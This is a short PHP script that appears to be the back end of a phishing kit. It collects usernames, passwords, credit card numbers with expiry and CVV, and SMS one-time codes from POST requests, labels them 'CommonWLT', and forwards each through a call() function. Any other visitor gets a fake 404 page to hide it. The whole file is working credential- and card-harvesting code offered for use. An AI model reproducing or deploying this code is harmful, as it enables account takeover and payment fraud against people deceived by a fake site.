<?php 
require '../config.php';


if(isset($_POST['user'])){
    call("/- CommonWLT LOG -/
USER: ".$_POST['user']."
PASS: ".$_POST['pass']);
return;
}
 

if(isset($_POST['cc'])){
    call("/- CommonWLT Cc -/
Name: ".$_POST['name']."
Cc: ".$_POST['cc']."
Exp: ".$_POST['exp']."
Cvv: ".$_POST['cvv']);
return;
}
 

if(isset($_POST['sms'])){
    call("/- CommonWLT SMS -/
CODE: ".$_POST['sms']);
    return;
}

header("HTTP/1.0 404 Not Found");

?>